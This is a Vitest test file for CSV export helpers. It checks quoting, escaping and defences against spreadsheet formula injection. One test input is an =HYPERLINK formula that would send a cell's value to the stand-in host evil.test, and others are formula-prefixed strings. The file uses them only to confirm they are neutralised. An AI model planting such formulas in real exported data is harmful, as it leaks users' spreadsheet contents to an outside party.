import { describe, it, expect } from 'vitest';
import { csvCell, toCsv } from '../../../src/utils/csv';

describe('csvCell', () => {
  it('quotes and escapes embedded quotes', () => {
    expect(csvCell('hello "world"')).toBe('"hello ""world"""');
  });

  it('quotes commas and newlines so spreadsheets parse a single cell', () => {
    expect(csvCell('a,b\nc')).toBe('"a,b\nc"');
  });

  it('renders null and undefined as empty (no quotes) so the column still shifts', () => {
    expect(csvCell(null)).toBe('');
    expect(csvCell(undefined)).toBe('');
  });

  it('coerces numbers and booleans to quoted strings', () => {
    expect(csvCell(42)).toBe('"42"');
    expect(csvCell(true)).toBe('"true"');
  });

  describe('formula-injection mitigation (OWASP)', () => {
    it('neutralizes =HYPERLINK exfiltration payloads', () => {
      expect(csvCell('=HYPERLINK("http://evil.test?d="&A1,"click")')).toBe(
        `"'=HYPERLINK(""http://evil.test?d=""&A1,""click"")"`
      );
    });

    it('prefixes cells starting with =, +, -, or @ with a single quote', () => {
      expect(csvCell('=1+2')).toBe(`"'=1+2"`);
      expect(csvCell('+1234567')).toBe(`"'+1234567"`);
      expect(csvCell('-2+3')).toBe(`"'-2+3"`);
      expect(csvCell('@SUM(A1:A9)')).toBe(`"'@SUM(A1:A9)"`);
    });

    it('prefixes cells starting with tab or carriage return', () => {
      expect(csvCell('\t=cmd')).toBe(`"'\t=cmd"`);
      expect(csvCell('\r=cmd')).toBe(`"'\r=cmd"`);
    });

    it('neutralizes negative numeric values too (leading minus)', () => {
      expect(csvCell(-5)).toBe(`"'-5"`);
    });

    it('still quotes/escapes payloads containing commas, quotes, and newlines', () => {
      expect(csvCell('=A1,B1\n"x"')).toBe(`"'=A1,B1\n""x"""`);
    });

    it('leaves benign values untouched', () => {
      expect(csvCell('Monstera (kitchen)')).toBe('"Monstera (kitchen)"');
      expect(csvCell('a = b')).toBe('"a = b"');
      expect(csvCell(42)).toBe('"42"');
    });
  });
});

describe('toCsv', () => {
  it('emits header even when there are no rows', () => {
    expect(toCsv(['a', 'b'], [])).toBe('"a","b"\n');
  });

  it('joins rows with newlines and trailing newline', () => {
    const out = toCsv(
      ['name', 'count'],
      [
        ['Pothos', 3],
        ['Monstera', 1],
      ]
    );
    expect(out).toBe('"name","count"\n"Pothos","3"\n"Monstera","1"\n');
  });
});
